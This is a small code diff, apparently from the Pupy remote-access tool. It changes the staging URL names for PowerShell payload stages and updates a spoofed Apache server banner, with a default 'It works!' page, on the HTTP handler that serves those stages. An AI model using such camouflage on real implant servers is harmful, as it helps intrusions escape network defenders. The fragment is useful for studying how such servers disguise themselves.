@@ -19,8 +19,8 @@ import socket
 
 # "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener, the ps1_listener payload will not be able to get stages -:(
 url_random_one      = "index.html"
-url_random_two_x86  = "voila.html"
-url_random_two_x64  = "tata.html"
+url_random_two_x86  = "news.txt"
+url_random_two_x64  = "taga.html"
 
 APACHE_DEFAULT_404 = """<html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
@@ -29,7 +29,7 @@ APACHE_DEFAULT_404 = """<html><body><h1>It works!</h1>
 
 class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.server_version = "Apache/2.4.27 (Unix)"
+        self.server_version = "Apache/2.4.28 (Unix)"
         self.sys_version    = ""
 
         if self.path == "/%s" % url_random_one:
